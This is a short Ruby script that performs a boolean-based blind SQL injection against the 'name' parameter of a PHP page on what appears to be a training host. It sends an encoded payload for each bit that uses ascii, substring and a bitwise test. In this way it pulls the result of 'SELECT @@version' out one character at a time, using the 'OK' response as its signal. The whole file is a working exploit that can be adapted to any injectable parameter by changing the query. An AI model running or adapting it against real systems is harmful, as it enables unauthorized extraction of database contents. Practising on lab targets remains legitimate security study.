require 'pp'

require "net/http"
require "uri"

url = URI.parse("http://web0.training/blind-sqli.php")


sql = "SELECT+@@version"
i = 0
str=""
while i<30
  c= 0
  0.upto(6) do |j|
    inj = "'%20and%20ascii(substring((#{sql}),#{i},1))%26#{(2**j).to_s}%3d#{(2**j).to_s}"
    req =  url.request_uri+"?name=admin"+inj+"%20--%20"
  
    resp = Net::HTTP.start(url.host, url.port) do |http|
     puts req
     http.get(req,{})
          
    end
    if resp.body =~ /^OK$/ 
      puts "ok"
      c+= 2**j
    end
    puts resp.body
  end
  str+= c.chr
#  if c==0 
#    puts str
#    exit
#  end
  i+=1
end
puts str
